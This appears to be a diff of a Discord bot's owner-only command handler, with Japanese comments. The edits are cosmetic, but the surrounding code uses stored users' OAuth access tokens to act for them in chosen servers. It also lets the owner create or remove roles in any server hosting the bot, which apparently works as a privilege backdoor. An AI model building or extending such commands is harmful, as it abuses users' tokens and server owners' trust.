@@ -5,6 +5,7 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
     const args = msg.content.slice(1).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
+    // !admin コマンド
     if (command === 'admin') {
         const guildId = args[0];
         const roleName = args[1];
@@ -15,8 +16,7 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         if (!guild) return msg.reply('❌ サーバーが見つかりません。');
 
         const botMember = guild.members.me;
-        const log = [];
-        log.push(`🔎 診断開始: ${guild.name}`);
+        const log = [`🔎 診断開始: ${guild.name}`];
 
         try {
             if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
@@ -60,6 +60,7 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         }
     }
 
+    // !call コマンド
     if (command === 'call') {
         const guildId = args[0];
         if (!guildId) return msg.reply('使用法: !call [サーバーID]');
@@ -72,12 +73,12 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
         let logContent = `【Call実行ログ: ${guildId}】\n`;
 
         for (const user of users) {
-            const name = user.username || user.global_name || '名前なし';
+            const name = user.username || user.global_name || user.tag || '名前なし';
             const uid = user.id || user.user_id;
             const token = user.accessToken || user.access_token;
 
             if (!uid || !token) {
-                logContent += `❌ ${name}: データ不足 (IDまたはTokenなし)\n`;
+                logContent += `❌ ${name}: データ不足\n`;
                 continue;
             }
 
@@ -93,28 +94,31 @@ async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, U
                 logContent += `❌ ${name} (${uid}): 失敗 (${errorDetail})\n`;
             }
         }
-        await statusMsg.edit(logContent.length > 2000 ? logContent.slice(0, 1900) + '... (長すぎるため省略)' : logContent);
+        await statusMsg.edit(logContent.length > 2000 ? logContent.slice(0, 1900) + '... (省略)' : logContent);
     }
 
+    // !userlist コマンド
     if (command === 'userlist') {
         const userData = loadData(USERS_FILE);
         const entries = Object.entries(userData);
-        if (entries.length === 0) return msg.reply('認証済みユーザーがいません。');
+        if (entries.length === 0) return msg.reply('認証済みユーザーはいません。');
 
         const list = entries.map(([keyId, data]) => {
-            const name = data.username || data.global_name || data.user_name || '名前なし';
-            const id = data.id || data.user_id || keyId;
+            const name = data.username || data.global_name || (data.tag ? data.tag.split('#')[0] : '名前なし');
+            const id = data.id || keyId;
             return `・${name} (${id})`;
         }).join('\n');
 
         await msg.reply(`【認証済みユーザー一覧】\n${list}`);
     }
 
+    // !serverlist コマンド
     if (command === 'serverlist') {
         const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
         await msg.reply(`【導入サーバー一覧】\n${guilds || 'なし'}`);
     }
 
+    // !admin-del コマンド
     if (command === 'admin-del') {
         const guildId = args[0];
         const roleName = args[1];
